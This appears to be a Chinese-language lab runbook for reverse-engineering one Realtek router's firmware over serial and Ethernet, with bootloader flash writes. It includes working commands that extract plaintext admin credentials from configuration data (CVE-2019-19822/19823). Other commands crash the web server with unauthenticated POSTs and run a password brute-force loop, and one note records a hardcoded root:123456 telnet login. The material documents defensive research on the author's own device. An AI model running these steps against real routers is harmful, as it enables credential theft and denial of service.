> 這台已經用兩種進位制咬過人一次(`FLR` 的長度十六進位、`DB` 的長度十進位),
> 所以這裡寫成十進位並且把換算寫出來。

> ❌ **`cmp` 說不同 → 停,而且這是好消息不是壞消息。** 兩種可能,都要查清楚:
> (a) 你的 dump 是在改過設定之後讀的,而 `config.dat` 是現況 —— 重讀一次 `A5` 的快照;
> (b) 範圍不對 —— `COMPCS` 的長度在 header 裡,不一定是 7,490。
> **不要調整範圍去湊到相同。** 先確認長度從哪裡來。

### A8.5.3 解出裡面的密碼,然後拿它去認證

```bash
"$HOME/fwre-work/venv/bin/python" -m fwrecon compcs "$D/config-dat.bin" \
    --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
    --disclosure reveal -f md | grep -iE 'USER_NAME|USER_PASSWORD'
```

然後拿那組值去跑 `A11.5` —— **它會通**。

### 為什麼這一節值得單獨存在

**這條鏈的每一環都能單獨指出來,而且用的是不同的儀器:**

| 環 | 誰量的 | 走哪條路 |
|---|---|---|
| HTTP 回應 7,490 bytes | `curl` | 乙太網路 |
| flash `0xC000` 起 7,490 bytes | bootloader 的 `FLR` + `DB` | 序列埠 |
| 那份 blob 裡的 `USER_PASSWORD` | `fwrecon compcs` | LZSS 解碼 + `libapmib` 的 checksum |
| 那組明文通過認證 | `curl -u` | 乙太網路 |

> ★ **而第二環順手關掉一個從 W02 就開著的缺口。** W02 說「沒有第二個獨立儀器讀過
> 這顆 flash」——每一個 byte 都是經 bootloader 的 `FLR` 來的,所以一個系統性錯誤的
> `FLR` 會是隱形的。
>
> 這一節裡,`boa` 經 **kernel 的 MTD 驅動**、走**乙太網路**讀了同一塊區域;
> W02 經 **bootloader 的 SPI 常式**、走 **UART**。
> **兩條不共用任何程式碼的路徑,同一組 bytes。**
> 那是**佐證(corroboration)**,不是**重複(repeatability)** —— 而那一欄從
> 2026-08-16 起一直是空的。**範圍是 `0xC000`–`0xD142`,不是整顆晶片。**

> ⚠️ **這是 CVE-2019-19822(未認證設定外洩)加 CVE-2019-19823(明文儲存),
> 兩個都是 2019 年公開的。** 這一節重現的是已公開的東西,不是新發現 ——
> 這個專案自己的部分是**那條佐證鏈**,不是那個漏洞。

---

## A9 🔌 POST 輪 —— **這一節會改變裝置的設定**

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | **改設定。而且它已經證明會把 web server 弄掉。** |
| **前置** | **`A5` 的快照必須已經抓好** |
| **關掉的項目** | `P1-4` · `P1-5` · `P1-6` |
| **最後驗證** | 2026-08-17(跑兩次,兩次都在第 45 個附近把 `boa` 弄掉) |

**跑之前先讀完這一整節。**

```bash
python3 tools/bench-probe.py endpoints --host 10.1.1.1 --allow-post \
        -o "$HOME/fwre-work/dumps/endpoints-post.json"
```

**預期開頭**(這一行是重點,它列出**不會**被打的端點):

```text
  note  13 of 64 endpoints will not be POSTed: formTcpipSetup, formPasswordSetup,
        formUpload, formVlan, formWanTcpipSetup, formOpMode, formOpMode1,
        formOpMode2, formWizard, formRebootCheck, formSaveConfig,
        formUploadConfig, formRebootSchedule
```

**已知會發生的事(2026-08-17 兩次一致)**:

```text
送出 POST 34–36 個   有回應 31–32   零個 404
最慢: formPortFw 9650ms · formPocketWizard 6359ms
      formWlanSetup / formRoute / formSysLog 各 ~6008ms
約第 45 個之後 -> control failed ... ConnectionRefusedError
```

> 🔴 **這不是掃描失敗,這是結果。** 不帶任何參數的未認證 POST,佔住這台唯一的
> web server 4.7–9.7 秒;約 45 個連續請求讓它徹底停止服務。
> `ping` 全程正常、console 一行訊息都沒有、20 分鐘後 `boa` 沒有自己回來
> —— `rcS` 是一次性啟動它的,不是 respawn。**斷電重開即復原。**

> 🔴 **這一輪之後 IoC 的基準會變,而那是預期的。** 跑完之後:
> 1. 回 `A3` + `A5` 再抓一份快照(檔名用 `-post`)
> 2. 逐欄位歸因:
>    ```bash
>    tools/config-attrib.sh <pre.bin> <post.bin>
>    ```
> 3. **新的數字成為新基準**,舊的連同「是哪一步造成的」一起留在 `BENCH-LOG.md`
>
> **守住基準只證明沒動到;歸因證明了動了什麼、被誰動的。** 而沒有前後快照就掃,
> 等於把基準洗掉而且說不出被誰洗的。

> ⚠️ **2026-08-17 的歸因結果,先知道再跑:** `H601` 與 bootloader 未動;
> `COMPCS` 動 19 欄;**`COMPDS` 動 23 欄** —— 同樣那 19 個加上原本區分兩區的 4 個,
> 而且每一個都移到 `COMPCS` 的值。**一次未認證的設定寫入會把出廠預設區覆蓋掉。**

---

## A10 🔌 冷開機計時(一次上電餵三項)

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | 純讀 |
| **前置** | 板子**斷電**;`A4` 的網段已設好 |
| **關掉的項目** | `P1-12` |
| **最後驗證** | 2026-08-17 |

```bash
bash tools/coldboot-timing.sh /dev/ttyUSB0 10.1.1.1 "$HOME/fwre-work/dumps"
```

**看到這一行才 🔌 插電**(這次**不要**送 ESC,讓它正常開機):

```text
        >>> POWER THE ROUTER ON NOW <<<   (no ESC; let it boot)
```

**預期**:

```text
  ok    first console line at t=0:
  ok    first HTTP 200:
        38.76 s from the console's first line

  ==>   markers
3:… chipName: UNKNOWN
6:… ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
33:… init started: BusyBox v1.13.4 (2018-01-10 14:56:45 CST)
69:… boa: starting server pid=350, port 80
```

> ⚠️ **`boa` 自報啟動之後還有約 6.3 秒不能服務**(+32.50 vs +38.76)。
> **所以掃描前要等 45 秒,不是 40。**

> ⚠️ **這顆 kernel 不印 `Kernel command line:`,也不印 `Linux version`。**
> 那不是你的擷取漏了 —— **那兩個字串裡的第一個根本不在 kernel image 裡**。
> 腳本會為此報一行 `FAIL`,而在這台上那是預期的。

---

## A11 🔌 救援路徑 —— 非破壞性上限

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | 純讀 **只要你不上傳任何東西**。`AUTOBURN` 是 RAM 變數,斷電就沒 |
| **前置** | 板子停在 `<RealTek>`;`A4` 的網段已設好 |
| **關掉的項目** | `P9-3` |
| **最後驗證** | 2026-08-17 |

```bash
python3 -u tools/console-dump.py rescue --at-prompt --ip 10.1.1.1 \
        -o "$HOME/fwre-work/dumps/rescue.json"
```

**預期**:

```text
  ==>   autoburn off   (the switch that decides whether an upload reaches flash)
        'AUTOBURN: 0' -> Unknown command !
  ok    the form this loader accepts is 'AUTOBURN 0'
        AutoBurning=0
  ok    autoburn is off
  ==>   IPCONFIG 10.1.1.1
        'IPCONFIG:10.1.1.1' -> Unknown command !
  ok    the form this loader accepts is 'IPCONFIG 10.1.1.1'
        Now your Target IP is 10.1.1.1
  ok    the loader reports 10.1.1.1
```

**驗證**(主機端):

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
ping -c 3 -W 2 10.1.1.1
ip neigh show 10.1.1.1
cat "/sys/class/net/$IF/statistics/rx_packets"
```

**預期 —— 而它跟直覺相反:**

```text
3 packets transmitted, 0 received, 100% packet loss
10.1.1.1 dev enx… lladdr 56:0a:01:01:01:e8 REACHABLE
1
```

> 🔴 **`ping` 收 0 是正常的,不是失敗。** loader 的堆疊只做 ARP + UDP/TFTP,
> **沒有義務實作 ICMP**。成功的判據是 **`ip neigh` 是 `REACHABLE`**
> 加上 **`rx_packets` 從 0 變 1** —— 那是兩個不共用程式碼的來源。
>
> 而那個 MAC(`56:0a:01:01:01:e8`)**不是網卡燒錄的位址**:
> `0a 01 01 01` 就是 `10.1.1.1`,loader 從你給的 IP 合成一個出來。
> **2026-08-17 我把「ping 有回應且 MAC 是這台」寫成成功條件,兩半都錯。**

> 🔴 **`AUTOBURN 0` 一定要在 `IPCONFIG` 之前。** 順序反過來,網路一起來就有一個
> autoburn 狀態未知的 TFTP 伺服器在聽。工具強制這個順序,而且**它只送得出 `0`**。

> ⚠️ **`AUTOBURN: 0`(有冒號)會回 `Unknown command !`** —— `?` 印的說明文字**不是語法**。
> loader 的字串表把指令 token 和說明行分開存。工具會依序試候選形式並印出哪一個成立。

> ❌ **這一節結束後拔電重開。** 不要從 `IPCONFIG` 過的狀態直接 `J` 或繼續開機。

---

## A11.5 🔌 憑證與 session —— 兩個來源位址

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | **純讀。**登入一次不寫任何東西(這個 build 沒有 session 可寫) |
| **前置** | `A4` 的網段已設好;密碼已從 flash 解出來 |
| **關掉的項目** | `P2-7` · `P2-8` |
| **最後驗證** | 2026-08-17 |

**密碼不是猜的,是從你自己的 flash 解出來的** ——
`USER_NAME` / `USER_PASSWORD`,明文,兩個獨立來源(`fwrecon compcs`,以及廠商自己的
`flash get`)。所以登入成功是**在自己的機器上把 CVE-2019-19823 端到端走完**。

```bash
# 從你的快照解出憑證。--disclosure protect 會遮掉,要看明文才加 reveal
"$HOME/fwre-work/venv/bin/python" -m fwrecon compcs \
    "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin" --offset 0xC000 \
    --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
    --disclosure reveal -f md | grep -iE 'USER_NAME|USER_PASSWORD'
```

**不帶憑證 / 帶憑證 / 帶錯的,三個一起打,才有對照組:**

```bash
U=admin; P=admin      # 換成上面解出來的
for label in none good bad; do
  case "$label" in
    none) A=() ;;
    good) A=(-u "$U:$P") ;;
    bad)  A=(-u "$U:wrongpassword") ;;
  esac
  printf '%-5s ' "$label"
  curl -s -o /dev/null -D- -m 6 "${A[@]}" http://10.1.1.1/password.htm \
    | awk '/^HTTP|^Location|^Set-Cookie/{printf "%s | ", $0}'
  echo
done
```

**預期**:

```text
none  HTTP/1.1 302 Found | Location: http://10.1.1.1/login.htm |
good  HTTP/1.1 200 OK |
bad   HTTP/1.1 302 Found | Location: http://10.1.1.1/login.htm |
```

> 🔴 **`Set-Cookie` 一行都不會出現,而那是這一測最重要的輸出。**
> 這個 build **沒有 session**:授權是每一個請求各自的 HTTP Basic。
> 不是 2015 的 `AUTHG_IP_ADDR`、不是 2020 的五格表、**也不是反組譯指到的那個全域**。

**session 模型 —— 用第二個來源位址,而這一測不必再讀一行組語:**

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
sudo ip addr add 10.1.1.101/24 dev "$IF" 2>/dev/null
# 1) .100 帶憑證成功  2) 之後 .100 不帶憑證  3) .101 帶憑證
for src in 10.1.1.100 10.1.1.101; do
  printf '%s with    ' "$src"
  curl -s -o /dev/null -w '%{http_code}\n' -m 6 --interface "$src" \
       -u "$U:$P" http://10.1.1.1/password.htm
  printf '%s without ' "$src"
  curl -s -o /dev/null -w '%{http_code}\n' -m 6 --interface "$src" \
       http://10.1.1.1/password.htm
done
```

**預期 —— 成功之後同一個位址不帶憑證仍然被擋,那就是「沒有 session」的證據:**

```text
10.1.1.100 with    200
10.1.1.100 without 302
10.1.1.101 with    200
10.1.1.101 without 302
```

**沒有帳號鎖定 —— 這一項要真的跑完,不要跑三次就下結論:**

```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -m 6 -u "$U:wrong$i" http://10.1.1.1/password.htm
done
printf 'after 50 wrong, the 51st correct one: '
curl -s -o /dev/null -w '%{http_code}\n' -m 6 -u "$U:$P" http://10.1.1.1/password.htm
```

**預期**:`200`。**五十次錯誤之後第五十一次正確的仍然通** = 沒有計數器、沒有鎖定。

> ⚠️ **「沒有 session」不等於「沒有 CSRF」。** 瀏覽器會自動重送快取的 Basic 憑證,
> 所以跨站面是靠另一個機制活著的。這是推論,不是這一測量到的東西。

> ❌ **`good` 那一行不是 200 → 停,不要重試。** 要嘛解碼器錯了,要嘛這台被改過密碼。
> 回去查 `fwrecon compcs` 的輸出,不要在裝置上試別的密碼。

---

## A12 🔌🔴 寫 flash(`FLW`)—— **唯一不可逆的一節**

| | |
|---|---|
| **層** | T2 |
| **會不會改變裝置** | **不可逆** |
| **前置** | **兩份 dump 的雜湊都對過**;`A5` 的快照已抓 |
| **關掉的項目** | `P0-3` |
| **最後驗證** | 2026-08-17(演練於 `0x3F0000`;磁區語意的判別讀在同日下午) |

> ## 🔴 動手前的四條規矩
>
> 1. **每一行先看完,再貼。不准現打。** 這台已經教過一課:兩個相鄰指令用兩種
>    進位制(`FLR` 的長度是**十六進位**,`DB` 的長度是**十進位**)。
>    **`FLW` 的參數順序打錯 = 把測試樣式寫進 kernel。**
> 2. **只碰你事先確認過是空的那個位址。** 不要「順便試試看 `0x350000`」。
> 3. **`tools/console-dump.py` 送不出 `FLW`**(它的 `FORBIDDEN` 擋掉
>    `FLW`/`EB`/`EW`/`J `)。**這是刻意的:寫入指令由讀過它的人親手打,不由腳本發。**
>    所以這一節用 `picocom`。
>    (`AUTOBURN` 是唯一的例外,見 `A11` —— 因為擋掉它反而更危險。)
> 4. **每一步看到預期輸出才准下一步。** 對不上就停,填紀錄卡,回報。

**開始之前,先讓機器確認安全網在:**

```bash
make doctor TIER=2
```

必須看到 `two independent reads agree — there is a safety net`。

> ❌ **只有一份 dump,或雜湊不符 → 不要寫。** 那是這台的唯一備份。

### 為什麼 `0x3F0000` 是安全的演練標的

W02 的完整 dump 證明 **`0x350000` 到 partition 結尾整段是 `FF`(已抹除)**,
沒有任何東西讀它。映像本體結束在 `0x34A041`(3.29 MiB)。

### 開 picocom

```bash
picocom -b 38400 --logfile "$HOME/fwre-work/dumps/flw-$(date +%Y%m%d-%H%M).log" /dev/ttyUSB0
```

**離開 picocom 是 `Ctrl-A` 然後 `Ctrl-X`。先記住,等一下會用到。**

> 🔴 **不要加 `--omap crlf`。** picocom 的 `crlf` 是「把 CR 換成 LF」,不是
> 「CR 後面補 LF」,送出去的行尾會變成裸 `LF`,而這台的 bootloader 收 `CR`。
> 更糟的是**任何多送的一個換行都會被 `FLR` 的 `(Y)es , (N)o ?` 吃掉當答案** ——
> 代價是拿到一份格式完全正常、內容是 RAM 舊值的 dump。**維持預設,一個 map 都不要加。**

> 💡 **讀取那半邊可以不用手打。** `tools/console-dump.py dump --at-prompt …`
> 會自己處理 `Y` 提示、驗證回應、而且**先跑一個正對照組**(見 `A12` 末)。
> 它只是送不出 `EB` 和 `FLW`。所以兩種做法:
> **(a) 全程 picocom 手打** —— 人會等提示,陷阱咬不到人;
> **(b) 讀取用工具、寫入用 picocom** —— 要換手,但讀取那半邊有機器把關。
> **兩種都可以。不要混著半途改。**

按一次 **Enter**,應該看到乾淨的 `<RealTek>`。

---

### Step 1 — 確認目標區真的是空的(唯讀)

```text
FLR 80520000 3F0000 100
Y
DB 80520000 256
```

**預期**:`Flash Read Successed!`,然後**整片 `ff`**,16 行,每行 16 個 byte。

> ❌ **不是整片 `ff` → 停。** 那裡有東西,而換位址之前要先知道那是什麼。

### Step 2 — 在 RAM 裡放樣式,並且確認它真的進去了

```text
EB 80530000 DE AD BE EF DE AD BE EF
DB 80530000 8
```

**預期**:`de ad be ef de ad be ef`

> ✅ **`EB` 一次吃多個 byte:2026-08-17 實測可以。**(`?` 的說明寫了 `...`,
> 但在那之前沒有人這樣送過,`RUNBOOK §8.9` 把它列為「未實測」。)
> **如果 `DB` 讀回來只有第一個 byte 對**,就是一次只吃一個,改成八行
> `EB 80530000 DE` / `EB 80530001 AD` / … —— 而那是一條要記下來的裝置事實,不是失敗。

### Step 3 — 寫入(★ 第一個不可逆的動作)

```text
FLW 3F0000 80530000 8
Y
```

**預期 —— 而它不是你以為的那句話:**

```text
Write 0x00000008 Bytes to SPI flash#1, offset 0x003f0000<0xbd3f0000>, from RAM 0x80530000 to 0x80530008
(Y)es, (N)o->Y
.
```

> 🔴 **參數順序是 `<flash 位移> <RAM 位址> <長度>` —— 跟 `FLR` 的
> `<RAM 位址> <flash 位移> <長度>` 剛好相反。看兩遍再送。**

> ⚠️ **成功只印一個句點 `.`,不印 `Flash Write Successed!`。**
> 那句話確實存在於 loader 裡(stage2 `0x0a861`),但它屬於 **TFTP 自動燒錄路徑**;
> 互動式 `FLW` 的訊息是上面那個 `Write 0x… Bytes to SPI flash#1 …`。
> 兩條路徑相距 2.7 KiB,而 `Flash Read Successed!`(`0x0b4a4`)在互動叢裡 ——
> **那就是這個分群的對照組。**

> ⚠️ **`FLW` 的 Y 提示是 `(Y)es, (N)o->`,`FLR` 的是 `(Y)es , (N)o ? -->`。**
> 相鄰兩個指令,兩種標點。

> 💡 **回應順手洩漏 flash 的記憶體映射位址**:`offset 0x003f0000<0xbd3f0000>`
> —— SPI flash 映射在 `0xbd000000`(KSEG1 非快取區)。

### Step 4 — 讀回,而且讀到「另一個」RAM 位址

```text
FLR 80540000 3F0000 8
Y
DB 80540000 8
```

**預期**:`de ad be ef de ad be ef`

> 🔴 **一定要讀到 `80540000`,不要讀 `80530000`。** 讀回原位址只是把你剛剛放進去的
> 東西再看一次,**證明不了任何事**。
>
> **而「換一個沒用過的位址」還是不夠好** —— 你不知道那個位址裡本來是什麼。
> 更強的做法是先讀一塊**已知內容**的 flash 進去當對照組(`A12` 末的工具就是這樣做的)。
> 2026-08-17 上午這一格的證據就是因此不可採信,而下午重做時才補上對照組。

**這一步過了 = 回復路徑的「寫」半邊成立。還沒完。**

### Step 5 — ★ 量 `FLW` 的磁區語意

> **SPI NOR 的抹除單位是磁區(這顆 EN25QH32B 是 4 KiB),不是 byte。**
> 如果 `FLW` 為了寫 8 個 byte 而抹掉整個磁區,**那麼任何一次 `FLW` 都會毀掉同磁區
> 裡的其他內容** —— 那是救援時會殺死你的事實。

在**同一個 4 KiB 磁區**的另一個位址寫第二個樣式,然後回頭讀第一個:

```text
EB 80530100 CA FE BA BE CA FE BA BE
DB 80530100 8
FLW 3F0100 80530100 8
Y
FLR 80560000 3F0000 8
Y
DB 80560000 8
```

**兩種結果,都要記下來,都不是失敗:**

| 讀到 | 意思 | 對 W06 的影響 |
|---|---|---|
| `de ad be ef …` | `FLW` **保留磁區內其餘內容**(讀-改-抹-寫回) | 可以精準覆寫;但斷電失去的是整個 4 KiB |
| `ff ff ff ff …` | `FLW` **抹掉整個磁區而不保留** | 救援必須整個磁區一起寫回;`H601` 與 `COMPCS` 各自的磁區都是不可分割的單位 |

> ✅ **2026-08-17 的答案是第一種。** `FLW` 是**讀出整個磁區 → 改指定 byte →
> 抹除磁區 → 整段寫回**。三條證據:抹除後回到 `FF`(所以有抹除)、同磁區鄰居沒被清掉
> (所以抹除前先讀出來了)、而 loader 的**指令集裡一個抹除指令都沒有**
> (所以抹除只能由 `FLW` 自己做)。
>
> **仍然要自己跑一次。** 你的單位可能是不同的 flash 型號,而 loader 的型號表裡
> **沒有任何 Eon `QH` 系** —— console 上的 `chipName: UNKNOWN` 就是它認不出來,
> 所以走的是通用路徑,而通用路徑的行為沒有理由用別顆晶片去推。

### Step 6 — ★ 還原測試,而且它有兩種都正確的答案

```text
EB 80530200 FF FF FF FF FF FF FF FF
DB 80530200 8
FLW 3F0000 80530200 8
Y
FLR 80550000 3F0000 8
Y
DB 80550000 8
```

| 讀到 | 意思 | 判定 |
|---|---|---|
| `ff ff ff ff …` | `FLW` 有抹除語意(與 Step 5 一致)。**還原 = 直接覆寫** | ✅ 通過 |
| `de ad be ef …` | **`FLW` 是純程式化,`1` 只能變 `0`。** 寫 `FF` 什麼都沒改 | ⚠️ 見下 |

> ⚠️ **第二種結果不是操作失誤,是這台的物理性質。** 不要重試,不要換樣式。

### 如果 Step 6 讀回 `de ad be ef` —— 不要慌,但也不要繼續

**`P0-3` 的反證條件是事先寫下的**:「讀回與寫入不一致,**或抹除後不是全 FF**
→ 救援路徑不成立」。**照字面就是被反證了,而且不准事後改判。** 該做的是:

1. **先在 bootloader 裡找抹除指令**,把 `?` 的完整輸出留下來。
   `FLW` 的第四個參數 `<SPI cnt#>` 沒有人解釋過,抹除可能藏在那裡。
2. **記下來,今天到此為止。**

**同時要知道:這台不是沒有救。** `/bin/startup.sh` 有一條裝置自己的還原路徑 ——
`flash test-csconf` 失敗時它會用 `0x8000` 的出廠 `COMPDS` 蓋回 `0xC000`,
而 `H601`(`0x6000`)不在那條路徑上、不會被動到。
**但那是裝置自己做的,不是你執行的,而且它會把設定改回出廠值。**
它是安全網,不是救援路徑,兩者不能互相取代。

> 🔴 **而那條路徑有一個副作用,值得單獨記一筆:** 在「DS 與 CS 都無效」的分支裡,
> `flash default-sw` 之後緊接著是 **`flash set TELNET_ENABLED 1`**。
> 也就是**設定區同時損壞的裝置,重開之後 telnet 是開的** —— 而 `root:123456`
> 在這個 build 的 `passwd.org` 裡還在。**這是靜態讀出來的,還沒驗證。**

### Step 7 — 收尾

離開 picocom:`Ctrl-A` 然後 `Ctrl-X`。
**板子留在 `<RealTek>`,不要重開機**,如果後面還有節要跑。

---

### 讀取一律用工具,因為它帶對照組

```bash
python3 -u tools/console-dump.py dump --at-prompt \
        --flash 0x3F0100 --length 8 --ram 0x80560000 --chunk 8 \
        -o "$HOME/fwre-work/dumps/probe.bin"
xxd "$HOME/fwre-work/dumps/probe.bin"
```

它比手打多三件事,而**第三件是關鍵**:確認 `(Y)es` 真的被接受(不接受就丟例外);
每一塊解析驗證加二次取樣重讀;**對照組先把 flash `0x000000` 讀進同一個 `--ram`**,
比對已知的 `0b f0 00 04` —— 所以真正的讀取之前,那塊 RAM 裝的是**第三種東西**,
既不是 `ca fe ba be` 也不是 `ff ff ff ff`。
**「換一個沒用過的位址」比不上這個:沒用過的位址裡是什麼,你並不知道。**

> ❌ **這一格不准用 `--no-control`。** 對照組正是它的全部價值。

---

### W06 要用它做什麼:還原 16 KiB,不是 8 個 byte

2026-08-17 的 POST 輪把 `COMPDS`(`0x8000`–`0xC000`)覆寫成 `COMPCS` 了。
還原的來源是 `config-region-20260817-1102-pre.bin`
(與 8/16 完整 dump 的前 64 KiB 逐 byte 相同)。

**這比演練難的地方有三個,先想清楚再開始:**

1. **16 KiB = 4 個磁區**,而 `EB` 一次只灌幾個 byte。**手打灌不動 16 KiB。**
   需要一支寫入端的工具,而目前**沒有** —— `console-dump.py` 刻意送不出 `FLW`。
   **那支工具要先寫、要有守衛套件、而且要在演練區 `0x3F0000` 驗過,才准指向 `0x8000`。**
2. **每一個磁區都是讀-改-抹-寫回**,所以寫到一半斷電失去的是那 4 KiB。
   `COMPDS` 壞掉不致命(裝置自己會用它修 `COMPCS`,反過來就不行了) ——
   **但要在動手前確認方向,不要在寫壞之後才想。**
3. **還原之後要重新建立 IoC 基準**(`A5` 的 `tools/ioc-precheck.sh`),
   而預期值是**還原後應該回到 4 / 343**。**那一步就是這次還原的驗證。**

---

## A13 收尾與紀錄

| | |
|---|---|
| **層** | T1(記錄本身不碰裝置) |
| **關掉的項目** | —（這一節不關掉登記簿項目） |
| **最後驗證** | 2026-08-17 |

```bash
python3 tools/rtcase.py record --id <ID> --date <YYYY-MM-DD> \
    --verdict confirmed --evidence dynamic \
    --artefact BENCH-LOG.md --note "..."
make ledger
make todo WEEK=W05
```

> ❌ **`--artefact` 必須指向 repo 裡存在的檔。** `~/fwre-work/dumps/` 不在 repo 裡。
> 慣例是指 `BENCH-LOG.md`,substance 寫在 `--note` 裡。

> ❌ **`rtcase` 會拒絕一個沒有事先寫好反證條件的項目。** 那不是 bug。

**然後往 [`BENCH-LOG.md`](BENCH-LOG.md) 追加這一場**:計畫(動手前寫的)、紀錄卡、
逐字節錄、燒掉了什麼、下一場從哪裡開始。**只追加,不修改既有段落。**

> 🔴 **計畫要在動手之前 commit。** append-only + git 讓「寫在前面」可以被 diff 證明,
> 而那是這整套東西唯一不肯妥協的一件事。

---

## A14 出事的時候

| 症狀 | 原因 | 做什麼 |
|---|---|---|
| `Cannot find device "eth1"` 而 `ping` 卻通 | 網卡在 Windows 側,你繞過去了 | `A4` 的 `ip route get`。看 `via` |
| 抓不到任何封包 | 先看 `rx_packets`。`0` = 鏈路沒在送東西給你 | `A6` |
| `Speed: Unknown!` / `Duplex: Half` | 協商沒完成,或對端沒起來(例如板子停在 bootloader) | 正常,繼續 |
| 所有端點都「不存在」 | 你可能把 `boa` 打掛了 | `python3 tools/bench-probe.py control --host 10.1.1.1` |
| `boa` 完全不回應但 `ping` 通 | `A9` 的已知結果。`rcS` 不 respawn | **拔電重開** |
| `catch` 說 `booted past the interrupt window` | 板子沒有真的斷電過 | 確實拔電,停 2 秒,重跑 `A3` |
| `DB` 印出來跟上一次一樣 | `FLR` 沒生效(多半是 `Y` 被下一個指令吃掉) | 那是 RAM 舊值,不是 flash |
| 打錯 `FLW` 參數 | —— | **不要再送任何指令。拍照。** |
| `rtcase check` 說 artefact 不存在 | 證據連結要指到 repo 裡存在的檔 | `A13` |
| `test-ledger.md is out of date` | 改了登記簿沒跑 `make ledger` | `make ledger` |
| `binwalk: command not found` 而它明明裝了 | `~/.cargo/bin` 不在這個 shell 的 PATH | `bash tools/setup/setup-wsl.sh path`,然後用 `bash -lc` |
| IoC 預檢不是你記的那個數字 | 可能是上一場的 POST 輪 | 讀 `BENCH-LOG.md` 最後一場的「燒掉了什麼」 |

---

# Part B — 每一週跑哪幾節

> **只追加。** 一週做完就定版。**Part A 是可編輯的;這裡不是。**

## B-W05 偵察(2026-08-17,已完成:登記簿 27/27、DoD 5/5)

| 場次 | 順序 | 本週特有 |
|---|---|---|
| 上午 | `A0` → `A2` → `A3` → `A5` → `A4` → `A6` → `A7` → `A8` → `A13` | `A12` 的 `FLW` 演練(一次性,G3.5 #5) |
| 下午 | `A0` → `A2` → `A3` → **`A12` 讀磁區** → `A5` → `A4` → `A11` → `A10` → `A8` → `A9` → `A3` → `A5` → `A13` | 磁區語意判別;`P9-1` 靜態三來源 |

**下午那個順序有一個理由**:`A12` 的磁區讀取排在最前面,因為它答的是 W06 卡住的
那一格,而**一場只要提早結束,最不能掉的就是它**。

**這一週實際發生了什麼、以及四個儀器缺陷** → [`BENCH-LOG.md`](BENCH-LOG.md)。
**判定** → [`test-ledger.md`](test-ledger.md)。**推理** → [`PROGRESS.md`](PROGRESS.md)。

## B-W06 PoC(未開始)

**開場三件事,照這個順序:**

1. **還原 `COMPDS`** —— 2026-08-17 的 POST 輪把它覆蓋成 `COMPCS` 了。
   來源:`config-region-20260817-1102-pre.bin`(與 8/16 完整 dump 的前 64 KiB 相同)。
   範圍:`0x8000`–`0xC000`,16 KiB = 4 個磁區。走 `A12`。
   **然後重新建立 IoC 基準**,之後才有對照組。
2. `A0` → `A2` → `A3` → `A5` → `A4` → `A13`,加上開火與還原。
3. **決定 `BENCH-LOG.md` 標頭那個 MAC 矛盾往哪邊收** ——
   標頭說 per-unit 識別碼不寫進來,而上午那一段寫了兩個 MAC。
